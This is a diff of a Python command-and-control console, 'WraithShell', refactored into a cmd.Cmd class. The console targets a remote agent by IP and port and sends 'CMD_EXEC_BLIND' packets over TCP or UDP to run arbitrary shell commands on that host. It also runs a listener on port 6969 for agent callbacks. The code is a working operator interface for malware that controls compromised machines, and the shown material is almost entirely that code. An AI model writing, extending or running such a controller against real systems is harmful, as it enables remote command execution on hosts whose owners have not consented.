@@ -4,6 +4,7 @@ import socket
 import struct
 import random
 import threading
+import cmd
 
 MAGIC_BYTES = 0x0b1e55ed
 C2_PORT = 6969
@@ -11,7 +12,6 @@ CMD_MAP = {"CMD_PING" : 0x01, "CMD_EXEC_BLIND" : 0x02}
 
 PURPLE = "\033[95m"
 RESET  = "\033[0m"
-PROMPT = f"{PURPLE}wraith>{RESET} "
 
 def send_packet_TCP(cmd, cmd_type, agent_ip, port):
 
@@ -41,164 +41,227 @@ def send_packet_UDP(cmd, cmd_type, agent_ip, port):
 
     send(pkt, verbose=False)
 
-def start_listener():
 
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind(("0.0.0.0", C2_PORT))
-    server.listen(1)
 
-    stop_event = threading.Event()
+class WraithShell(cmd.Cmd):
 
-    def _accept_loop():
-        
-        server.settimeout(1.0) 
-        while not stop_event.is_set():
+    # Set up target IP and port, sender wrapper, and listener
+    def __init__(self):
+        super().__init__()
+        self.target_IP = None
+        self.target_port = None
+        self.current_protocol = "TCP"
+        self.sender_wrapper = send_packet_TCP
+        self.stop_listener = None
+        self._update_prompt()
+
+    # Helper function to update the prompt when a target is set
+    def _update_prompt(self):
+        if self.target_IP and self.target_port:
+            self.prompt = f"{PURPLE}wraith [{self.target_IP}:{self.target_port}][{self.current_protocol}]>{RESET} "
+        else:
+            self.prompt = f"{PURPLE}wraith [{self.current_protocol}]>{RESET} "
+
+    # Helper function to check if target is set
+    def _check_target(self):
+        if not self.target_IP and not self.target_port:
+            print("Target IP and port have not been set")
+            return False
+        return True
+
+    # Helper function for listener
+    def _start_listener(self):
+
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        server.bind(("0.0.0.0", C2_PORT))
+        server.listen(1)
+
+        stop_event = threading.Event()
+
+        def _accept_loop():
             
-            try:
-                conn, addr = server.accept()
-            except socket.timeout:
-                continue  # loop back and check stop_event
-            except OSError:
-                break     # socket was closed externally
-
-            output = b""
-            while True:
-                chunk = conn.recv(4096)
-                if not chunk:
-                    break
-                output += chunk
-            conn.close()
-
-            message = output.decode(errors="replace").strip().lower()
-            if message == "pong":
-                print(f"\n[+] Pong received from {addr[0]}")
-
-            print(PROMPT, end="", flush=True)
-
-    # Thread the accept loop
-    t = threading.Thread(target=_accept_loop, daemon=True)
-    t.start()
-
-    def stop():
-        stop_event.set()
-        t.join(timeout=2)
-
-    return stop
-
-def shell():
-
-    stop_listener = None
-    
-    sender_wrapper = send_packet_TCP
-
-    while True:
-        try:
-            input_command = input(PROMPT).strip()
-        except (EOFError, KeyboardInterrupt) as e:
-            print(e)
-
-            if stop_listener:
-                stop_listener()
-
-            print("Exiting WraithShell")
-            exit()
-
-        if not input_command:
-            continue 
-
-        input_arr = input_command.split()
-        
-        match input_arr[0].lower():
-
-            # Handle ping
-            case "ping":
-
-                IP = input_arr[1]
-                port = 0
-
-                # ping <IP>
-                if len(input_arr) == 2:
-
-                    port = random.randint(1, 65535)
-                    sender_wrapper("ping", "CMD_PING", IP, random.randint(1, 65535))
-                    print(f"Sent ping to {IP} over port {port}")
+            server.settimeout(1.0) 
+            while not stop_event.is_set():
                 
-                # ping <IP> <port>
-                elif len(input_arr) == 3:
+                try:
+                    conn, addr = server.accept()
+                except socket.timeout:
+                    continue  # loop back and check stop_event
+                except OSError:
+                    break     # socket was closed externally
 
-                    port = int(input_arr[2])
-                    sender_wrapper("ping", "CMD_PING", IP, port)
-                    print(f"Sent ping to {IP} over port {port}")
+                output = b""
+                while True:
+                    chunk = conn.recv(4096)
+                    if not chunk:
+                        break
+                    output += chunk
+                conn.close()
 
-                else:
-                    print(f"Ping usage: ping [IP] [PORT]\nPort is optional")
+                message = output.decode(errors="replace").strip().lower()
+                if message == "pong":
+                    print(f"[+] Pong received from {addr[0]}")
 
-            # Handle server start
+        # Thread the accept loop
+        t = threading.Thread(target=_accept_loop, daemon=True)
+        t.start()
+
+        def stop():
+            stop_event.set()
+            t.join(timeout=2)
+
+        return stop
+
+    # Handle target
+    def do_target(self, arg):
+        """target set [IP] [PORT (optional)]\ntarget status
+        """
+        args = arg.split()
+
+        # Set target IP and port
+        if len(args) >= 2 and args[0] == "set":
+
+            self.target_IP = args[1]
+
+            if len(args) == 3:
+
+                self.target_port = int(args[2]) 
+            else:
+
+                self.target_port = random.randint(1, 65535)
+
+            print(f"Setting target to {self.target_IP}:{self.target_port}")
+            self._update_prompt()
+
+        elif len(args) == 1 and args[0] == "status":
+
+            if self.target_IP and self.target_port:
+                print(f"Current target is {self.target_IP}:{self.target_port}")
+
+            else:
+                print("Target IP and port has not been set")
+
+        else:
+            print(self.do_target.__doc__)
+
+    # Handle ping
+    def do_ping(self, arg):
+        """ping (that's all it is lol)"""
+
+        if not self._check_target():
+            return
+        
+        self.sender_wrapper("ping", "CMD_PING", self.target_IP, self.target_port)
+        print(f"Sent ping to {self.target_IP} over port {self.target_port}")
+
+    # Handle exec
+    def do_exec(self, arg):
+        """exec blind [cmd]"""
+
+        if not self._check_target():
+            return
+
+        cmd_blind_split = arg.split("blind", 1)
+
+        if len(cmd_blind_split) == 2:
+
+            cmd = cmd_blind_split[1].strip()
+
+            print(f"Executing command '{cmd}' BLIND")
+
+            self.sender_wrapper(cmd, "CMD_EXEC_BLIND", self.target_IP, self.target_port)
+
+        else:
+            print(self.do_exec.__doc__)
+
+    # Handle listener
+    def do_listener(self, arg):
+        """listener [start | stop | status]"""
+        match arg.strip().lower():
+
+            # Start listener
             case "start":
 
-
-                if len(input_arr) == 2 and input_arr[1].lower() == "listener":
-                    if stop_listener:
-                        print("Listener is already running")
-                    else:
-                        print(f"Starting listener on port {C2_PORT}")
-                        stop_listener = start_listener()
+                if self.stop_listener:
+                    print("Listener already running")
 
                 else:
-                    print("Start usage: start listener")
+                    print(f"Starting listener on port {C2_PORT}")
+                    self.stop_listener = self._start_listener()
 
-            # Handle server stop
+            # Stop listener
             case "stop":
 
-
-                if len(input_arr) == 2 and input_arr[1].lower() == "listener":
-                    if not stop_listener:
-                        print("Listener is not running")
-                    
-                    else:
-                        print(f"Stopping listener on port {C2_PORT}")
-                        stop_listener()
-                        stop_listener = None
+                if not self.stop_listener:
+                    print("Listener is not running")
 
                 else:
-                    print("Stop usage: stop listener")
+                    print("Stopping listener")
+                    self.stop_listener()
+                    self.stop_listener = None
 
-            case "protocol":
-
-                if len(input_arr) == 2 and input_arr[1].lower() == "tcp":
-
-                    if sender_wrapper == send_packet_TCP:
-                        print("Send protocol is already TCP")
-
-                    else:
-                        sender_wrapper = send_packet_TCP
-                        print("Switched send protocol to TCP")
-                
-                elif len(input_arr) == 2 and input_arr[1].lower() == "udp":
-
-                    if sender_wrapper == send_packet_UDP:
-                        print("Send protocol is already UDP")
-
-                    else:
-                        sender_wrapper = send_packet_UDP
-                        print("Switched send protocol to UDP")
+            case "status":
+                if self.stop_listener:
+                    print(f"Listener is running on port {C2_PORT}")
 
                 else:
-                    print("Protocol usage: protocol [tcp/ip]")
+                    print("Listener is not up")
 
-            # Handle exit
-            case "exit" | "quit":
-                if stop_listener:
-                    stop_listener()
+            case _:
+                print(self.do_listener.__doc__)
 
-                print("Exiting WraithShell")
-                exit()
+    # Handle protocol switching
+    def do_protocol(self, arg):
+        """protocol [tcp | udp]"""
 
+        match arg.strip().lower():
 
+            case "tcp":
+                if self.sender_wrapper == send_packet_TCP:
+                    print("Send protocol is already TCP")
 
+                else:
+                    self.sender_wrapper = send_packet_TCP
+                    self.current_protocol = "TCP"
+                    self._update_prompt()
+                    print("Switched send protocol to TCP")
 
+            case "udp":
+                if self.sender_wrapper == send_packet_UDP:
+                    print("Send protocol is already UDP")
+
+                else:
+                    self.sender_wrapper = send_packet_UDP
+                    self.current_protocol = "UDP"
+                    self._update_prompt()
+                    print("Switched send protocol to UDP")
+
+            case _:
+                print(self.do_protocol.__doc__)
+
+    # Handle exit and quit
+    def do_exit(self, arg):
+        """Exit WraithShell"""
+        if self.stop_listener:
+            self.stop_listener()
+
+        print("Exiting WraithShell")
+        return True
+
+    def do_quit(self, arg):
+        """Exit WraithShell"""
+        return self.do_exit(arg)
+
+    # Handle EOF
+    def do_EOF(self, arg):
+        print()
+        return self.do_exit(arg)
 
 if __name__ == "__main__":
-    #send_packet("touch tmp", "CMD_EXEC_BLIND", "127.0.0.1", 1)
-    shell()
+    
+    shell = WraithShell()
+    try:
+        shell.cmdloop()
+    except KeyboardInterrupt:
+        shell.do_exit("")
